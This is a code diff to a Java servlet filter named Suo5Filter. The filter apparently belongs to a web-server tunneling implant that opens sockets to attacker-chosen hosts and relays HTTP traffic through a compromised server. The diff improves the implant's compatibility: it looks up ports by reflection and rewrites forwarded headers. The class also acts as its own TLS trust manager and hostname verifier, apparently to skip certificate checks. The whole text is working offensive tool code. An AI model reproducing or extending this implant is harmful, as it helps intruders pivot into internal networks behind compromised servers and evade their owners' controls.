@@ -16,7 +16,6 @@ import java.util.Enumeration;
 import java.util.HashMap;
 
 public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509TrustManager {
-
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
 
@@ -69,7 +68,6 @@ public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509Trust
 //                e.printStackTrace();
         }
     }
-
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
         int bufferOffset = 0;
         while (bufferOffset < b.length) {
@@ -255,7 +253,12 @@ public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509Trust
             String host = new String((byte[]) dataMap.get("h"));
             int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
             if (port == 0) {
-                port = request.getLocalPort();
+                try {
+                    // Cannot convert Integer to int
+                    port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+                } catch (Exception e) {
+                    port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+                }
             }
             sc = new Socket();
             sc.connect(new InetSocketAddress(host, port), 5000);
@@ -405,7 +408,11 @@ public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509Trust
         String host = new String((byte[]) dataMap.get("h"));
         int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
         if (port == 0) {
-            port = request.getLocalPort();
+            try {
+                port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+            } catch (Exception e) {
+                port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+            }
         }
 
         InputStream readFrom;
@@ -519,14 +526,28 @@ public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509Trust
             ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
         }
 
+        byte[] newBody = marshal(dataMap);
         Enumeration headers = request.getHeaderNames();
         while (headers.hasMoreElements()) {
             String k = (String) headers.nextElement();
-            conn.setRequestProperty(k, request.getHeader(k));
+            if (k.equals("Content-Length")) {
+                conn.setRequestProperty(k, String.valueOf(newBody.length));
+                continue;
+            } else if (k.equals("Host")) {
+                conn.setRequestProperty(k, u.getHost());
+                continue;
+            } else if (k.equals("Connection")) {
+                conn.setRequestProperty(k, "close");
+                continue;
+            } else if (k.equals("Content-Encoding") || k.equals("Transfer-Encoding")) {
+                continue;
+            } else {
+                conn.setRequestProperty(k, request.getHeader(k));
+            }
         }
 
         OutputStream rout = conn.getOutputStream();
-        rout.write(marshal(dataMap));
+        rout.write(newBody);
         rout.flush();
         rout.close();
         conn.getResponseCode();
